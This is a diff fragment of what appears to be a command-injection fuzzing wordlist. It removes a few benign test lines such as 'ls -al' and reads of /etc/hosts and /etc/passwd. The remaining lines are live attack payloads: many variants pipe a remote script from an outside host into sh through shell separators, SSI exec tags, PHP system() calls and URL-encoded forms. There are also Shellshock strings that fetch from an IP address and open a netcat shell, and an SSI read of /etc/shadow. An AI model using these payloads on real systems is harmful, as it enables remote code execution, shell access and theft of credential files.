@@ -44,8 +44,6 @@ a|/usr/bin/curl https://oxagast.org/pwn/shell | sh -
 () { :;}; /bin/bash -c "wget http://135.23.158.130/.testing/shellshock.txt?vuln=25?shell=\`nc -lvvp 1235 -e /bin/bash\`"
 () { :;}; /bin/bash -c "wget http://135.23.158.130/.testing/shellshock.txt?vuln=27?shell=\`nc -lvvp 1237 -e /bin/bash &\`"
 () { :;}; /bin/bash -c "wget http://135.23.158.130/.testing/shellshock.txt?vuln=4"
-|/bin/ls -al
-cat /etc/hosts
 & curl https://oxagast.org/pwn/shell | sh - 
 & curl https://oxagast.org/pwn/shell | sh -  &
 ; curl https://oxagast.org/pwn/shell | sh - 
@@ -63,11 +61,9 @@ curl https://oxagast.org/pwn/shell | sh -
 <!--#exec cmd="/bin/cat /etc/shadow"-->
 <!--#exec cmd="/bin/curl https://oxagast.org/pwn/shell | sh - "-->
 <!--#exec cmd="curl https://oxagast.org/pwn/shell | sh -;-->
-{{ get_user_file("/etc/passwd") }}
 /index.html|curl https://oxagast.org/pwn/shell | sh - |
 &lt;!--#exec%20cmd=&quot;curl https://oxagast.org/pwn/shell | sh -;--&gt;
 &lt;!--#exec%20cmd=&quot;curl https://oxagast.org/pwn/shell | sh - &quot;--&gt;
-\n/bin/ls -al\n
 \ncurl https://oxagast.org/pwn/shell | sh - ;
 \ncurl https://oxagast.org/pwn/shell | sh - |
 \ncurl https://oxagast.org/pwn/shell | sh -;
@@ -76,7 +72,6 @@ curl https://oxagast.org/pwn/shell | sh -
 \n/usr/bin/curl https://oxagast.org/pwn/shell | sh - |
 \n/usr/bin/curl https://oxagast.org/pwn/shell | sh - \n
 <?php system("curl https://oxagast.org/pwn/shell | sh - ");?>
-;system('cat%20/etc/passwd')
 ;system('curl https://oxagast.org/pwn/shell | sh - ')
 system('curl https://oxagast.org/pwn/shell | sh - ');
 ;system('/usr/bin/curl https://oxagast.org/pwn/shell | sh - ')
